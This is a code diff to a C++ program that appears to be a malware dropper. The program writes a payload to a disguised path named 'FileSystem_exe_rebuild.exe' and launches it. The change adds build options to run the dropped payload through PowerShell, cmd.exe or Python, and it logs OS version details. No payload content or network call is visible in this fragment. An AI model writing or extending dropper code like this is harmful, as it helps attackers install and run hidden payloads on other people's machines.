@@ -17,6 +17,18 @@
 #define DROPPER_OUTPUT "\\FileSystem_exe_rebuild\\FileSystem_exe_rebuild.exe"
 #endif
 
+#ifndef POWERSHELL
+#define POWERSHELL 0
+#endif
+
+#ifndef BATCH
+#define BATCH 0
+#endif
+
+#ifndef PYTHON
+#define PYTHON 0
+#endif
+
 #include<cstdlib>
 #include<cstdint>
 #include<iostream>
@@ -200,6 +212,8 @@ std::uint64_t check_version(){
 		RTL_OSVERSIONINFOW info = {};
 		info.dwOSVersionInfoSize = sizeof(info);
 
+		print("Major, Minor, Build: %lu, %lu, %lu", info.dwMajorVersion, info.dwMinorVersion, info.dwBuildNumber);
+
 		if (pRtlGetVersion(&info) == 0){
 			return (std::uint64_t) info.dwMajorVersion;
 		}
@@ -363,10 +377,14 @@ void exe_launch(std::wstring run_exe)
 	sprintf_s(args, 999, "%s %s", cmd, run_exe);
 	CreateProcessA(cmd, args, NULL, NULL, FALSE, 0, NULL, NULL, &sia, &pia);
 	// call directly
+#elif POWERSHELL
+	CreateProcessW(L"powershell.exe", run_exe.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &siw, &piw);
+#elif BATCH
+	CreateProcessW(L"cmd.exe", run_exe.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &siw, &piw);
+#elif PYTHON
+	CreateProcessW(L"python.exe", run_exe.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &siw, &piw);
 #else
 	CreateProcessW( run_exe.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &siw, &piw);
-
-	return true;
 #endif
 }
 
